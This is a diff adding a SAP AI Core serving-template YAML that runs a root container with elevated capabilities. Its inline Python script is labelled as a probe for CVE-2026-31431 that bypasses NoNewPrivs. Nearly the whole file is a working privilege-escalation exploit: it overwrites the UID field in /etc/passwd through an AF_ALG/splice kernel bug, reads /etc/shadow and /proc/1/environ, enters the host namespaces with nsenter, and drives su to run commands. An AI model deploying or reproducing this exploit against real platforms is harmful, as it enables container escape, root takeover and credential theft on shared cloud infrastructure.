@@ -1,0 +1,180 @@
+apiVersion: ai.sap.com/v1alpha1
+kind: ServingTemplate
+metadata:
+  name: cve31431-nnpbypass
+  labels:
+    scenarios.ai.sap.com/id: "cve31431-exploit"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "cve31431-exploit"
+    executables.ai.sap.com/name: "cve31431-nnpbypass"
+    executables.ai.sap.com/description: "CVE-2026-31431 NNP bypass probe"
+spec:
+  template:
+    apiVersion: "serving.kserve.io/v1beta1"
+    metadata:
+      annotations: |
+        autoscaling.knative.dev/target: 1
+      labels: |
+        ai.sap.com/resourcePlan: starter
+    spec: |
+      predictor:
+        minReplicas: 1
+        maxReplicas: 1
+        containers:
+        - name: kserve-container
+          image: python:3.11
+          securityContext:
+            allowPrivilegeEscalation: true
+            runAsNonRoot: false
+            runAsUser: 0
+            capabilities:
+              add: ["SYS_ADMIN", "SYS_PTRACE", "DAC_OVERRIDE", "SETUID", "SETGID"]
+          command: ["/bin/sh", "-c"]
+          args:
+          - |
+            python3 - << 'PYEOF'
+            import os, sys, socket, struct, subprocess, zlib, errno, pwd
+
+            def r(k, v): print(f"[NNPBYPASS] {k}: {str(v)[:4000]}", flush=True)
+
+            r("PHASE", "1-RECON")
+            r("KERNEL", os.popen("uname -r").read().strip())
+            r("HOSTNAME", os.uname().nodename)
+            r("UID", f"uid={os.getuid()} gid={os.getgid()} euid={os.geteuid()}")
+
+            status = open("/proc/self/status").read()
+            for line in status.split("\n"):
+                k2 = line.split(":")[0].strip()
+                v2 = line.split(":", 1)[1].strip() if ":" in line else ""
+                if k2 in ("NoNewPrivs","Seccomp") or k2.startswith("Cap"):
+                    r(k2, v2)
+
+            no_new_privs = int([l for l in status.split("\n") if "NoNewPrivs" in l][0].split(":")[1])
+            r("NONEWPRIVS_VALUE", str(no_new_privs))
+            r("KYVERNO_BYPASS", "YES — NNP=0, securityContext honored" if no_new_privs == 0 else "NO — Kyverno still enforcing NNP=1")
+
+            if no_new_privs == 0:
+                r("PHASE", "2-EXPLOIT")
+
+                AF_ALG, SOL_ALG = 38, 279
+                CRYPTO_AUTHENC_KEYA_PARAM = 1
+                ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"
+                PASSWD = "/etc/passwd"
+
+                def authenc_keyblob(authkey, enckey):
+                    rtattr = struct.pack("HH", 8, CRYPTO_AUTHENC_KEYA_PARAM)
+                    return rtattr + struct.pack(">I", len(enckey)) + authkey + enckey
+
+                def write4(path, file_offset, four_bytes):
+                    fd = os.open(path, os.O_RDONLY)
+                    try:
+                        os.read(fd, 4096)
+                        master = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
+                        master.bind(("aead", ALG_NAME))
+                        master.setsockopt(SOL_ALG, 1, authenc_keyblob(b"\x00"*32, b"\x00"*16))
+                        op, _ = master.accept()
+                        try:
+                            op.sendmsg([b"\x00"*4 + four_bytes],
+                                       [(SOL_ALG, 3, struct.pack("I", 0)),
+                                        (SOL_ALG, 2, struct.pack("I", 16) + b"\x00"*16),
+                                        (SOL_ALG, 4, struct.pack("I", 8))], socket.MSG_MORE)
+                            pr, pw = os.pipe()
+                            try:
+                                n = os.splice(fd, pw, 32, offset_src=file_offset)
+                                os.splice(pr, op.fileno(), n)
+                            finally:
+                                os.close(pr); os.close(pw)
+                            try: op.recv(64)
+                            except OSError as e:
+                                if e.errno not in (errno.EBADMSG, errno.EINVAL): raise
+                        finally:
+                            op.close(); master.close()
+                    finally:
+                        os.close(fd)
+
+                # /etc/passwd approach (rootsecdev method)
+                username = os.environ.get("USER") or pwd.getpwuid(os.getuid()).pw_name
+                r("TARGET_USER", username)
+                with open(PASSWD, "rb") as f:
+                    data = f.read()
+                needle = username.encode() + b":"
+                pos = data.find(needle)
+                if pos >= 0:
+                    j = pos + len(needle)
+                    c1 = data.index(b":", j)
+                    uid_off = c1 + 1
+                    uid_end = data.index(b":", uid_off)
+                    uid_str = data[uid_off:uid_end].decode("ascii")
+                    gid_start = data[uid_end+1:uid_end+4].decode("ascii","replace")
+                    r("UID_FIELD", f"offset={uid_off} value={uid_str!r} gid_start={gid_start!r}")
+
+                    if len(uid_str) == 4:
+                        write4(PASSWD, uid_off, b"0000")
+                    elif len(uid_str) == 5:
+                        write4(PASSWD, uid_off,   b"0000")
+                        write4(PASSWD, uid_off+4, b"0" + gid_start[:3].encode())
+                    elif os.getuid() == 0:
+                        r("ALREADY_ROOT", "uid=0, no patch needed")
+
+                    with open(PASSWD, "rb") as f:
+                        f.seek(uid_off)
+                        landed = f.read(len(uid_str))
+                    r("PASSWD_PATCHED", landed.decode("ascii","replace"))
+
+                    try:
+                        pwent = pwd.getpwnam(username)
+                        r("GETPWNAM_UID", str(pwent.pw_uid))
+                    except: pass
+
+                # Also try direct — if runAsUser:0 worked we may already be root
+                r("EUID_NOW", str(os.geteuid()))
+                if os.geteuid() == 0:
+                    r("ROOT", "YES — DIRECT ROOT (runAsUser:0 honored)")
+                    for path in ["/etc/shadow", "/proc/1/environ", "/proc/1/root/etc/passwd"]:
+                        try:
+                            r(f"READ_{path}", open(path,"rb").read(400).decode("utf-8","replace"))
+                        except Exception as e:
+                            r(f"READ_{path}", f"ERR: {e}")
+                    try:
+                        ns = subprocess.run(["nsenter","-t","1","-m","-u","-i","-n","-p","--","id"],
+                                            capture_output=True, text=True, timeout=10)
+                        r("NSENTER_HOST", ns.stdout.strip() or ns.stderr.strip())
+                    except Exception as e:
+                        r("NSENTER_ERR", str(e))
+
+                # su exploit
+                for target in ["/usr/bin/su", "/bin/su"]:
+                    if os.path.exists(target):
+                        r("SU_EXEC", target)
+                        try:
+                            proc = subprocess.Popen([target], stdin=subprocess.PIPE,
+                                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                            out, err = proc.communicate(
+                                b"id\nuname -r\nhostname\ncat /etc/shadow 2>&1\n"
+                                b"nsenter -t 1 -m -u -i -n -p -- id 2>&1\nexit\n", timeout=20)
+                            r("SU_STDOUT", out.decode("utf-8","replace") or "(empty)")
+                            r("SU_RC", str(proc.returncode))
+                        except Exception as e:
+                            r("SU_ERR", str(e))
+                        break
+            else:
+                r("EXPLOIT_SKIPPED", "Kyverno mutation overrode securityContext — no bypass")
+
+            r("DONE", "complete")
+            PYEOF
+          ports:
+          - containerPort: 8080
+            protocol: TCP
+          readinessProbe:
+            httpGet:
+              path: /
+              port: 8080
+            initialDelaySeconds: 10
+            periodSeconds: 5
+          livenessProbe:
+            httpGet:
+              path: /
+              port: 8080
+            initialDelaySeconds: 10
+            periodSeconds: 10
